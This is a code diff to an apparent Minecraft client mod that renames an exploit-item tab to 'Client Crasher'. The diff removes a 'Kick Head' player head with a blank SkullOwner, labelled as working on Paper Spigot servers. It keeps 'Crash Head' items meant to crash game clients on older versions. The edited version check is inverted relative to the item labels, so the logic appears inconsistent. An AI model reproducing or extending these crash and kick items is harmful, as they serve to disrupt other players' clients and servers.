@@ -12,10 +12,10 @@ import net.raphimc.vialoader.util.VersionEnum;
 
 import java.util.Collection;
 
-public class ExploitPlayerHeadsCreativeTab extends CreativeTab {
+public class ClientCrasherCreativeTab extends CreativeTab {
 
-    public ExploitPlayerHeadsCreativeTab() {
-        super(new ItemStack(Items.PLAYER_HEAD).setCustomName(Text.literal("Exploit Player Heads")));
+    public ClientCrasherCreativeTab() {
+        super(new ItemStack(Items.BARRIER).setCustomName(Text.literal("Client Crasher")));
     }
 
     @Override
@@ -24,21 +24,7 @@ public class ExploitPlayerHeadsCreativeTab extends CreativeTab {
 
         final VersionEnum targetVersion = ProtocolHack.getTargetVersion();
 
-        final ItemStack paperKickHead = new ItemStack(Items.PLAYER_HEAD);
-        final NbtCompound paperKickHeadNBT = new NbtCompound();
-        paperKickHeadNBT.putString("SkullOwner", " ");
-        paperKickHead.setNbt(paperKickHeadNBT);
-        this.putClientsideName(paperKickHead,
-                Text.literal(
-                        Formatting.RED + Formatting.BOLD.toString() + "Kick Head" +
-                                Formatting.DARK_GRAY + " - " +
-                                Formatting.YELLOW + Formatting.BOLD + "Works on " +
-                                Formatting.AQUA + Formatting.BOLD + "Paper Spigot Server"
-                )
-        );
-        current.add(paperKickHead);
-
-        if (targetVersion.isOlderThan(VersionEnum.r1_11)) {
+        if (!targetVersion.isOlderThan(VersionEnum.r1_11)) {
 
             // This head uses a value that has an empty string as url.
             final ItemStack crashHead = new ItemStack(Items.PLAYER_HEAD);
@@ -58,9 +44,10 @@ public class ExploitPlayerHeadsCreativeTab extends CreativeTab {
             crashHead.setNbt(nbt);
             this.putClientsideName(crashHead,
                     Text.literal(
-                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Head" +
-                                    Formatting.DARK_GRAY + " - " +
-                                    Formatting.YELLOW + Formatting.BOLD + "Working at " + Formatting.DARK_RED + "<= 1.10.2 (needs to be placed in versions older than 1.8.0)"
+                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Head"
+                    ),
+                    Text.literal(
+                            Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)"
                     )
             );
             current.add(crashHead);
@@ -83,9 +70,10 @@ public class ExploitPlayerHeadsCreativeTab extends CreativeTab {
             crashHeadV2.setNbt(nbtV2);
             this.putClientsideName(crashHeadV2,
                     Text.literal(
-                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Head V2" +
-                                    Formatting.DARK_GRAY + " - " +
-                                    Formatting.YELLOW + Formatting.BOLD + "Working at " + Formatting.DARK_RED + "<= 1.10.2 (needs to be placed in versions older than 1.8.0)"
+                            Formatting.DARK_RED + Formatting.BOLD.toString() + "Crash Head V2"
+                    ),
+                    Text.literal(
+                            Formatting.YELLOW + Formatting.BOLD.toString() + "Working at <= 1.10.2 (needs to be placed in versions older than 1.8.0)"
                     )
             );
             current.add(crashHeadV2);
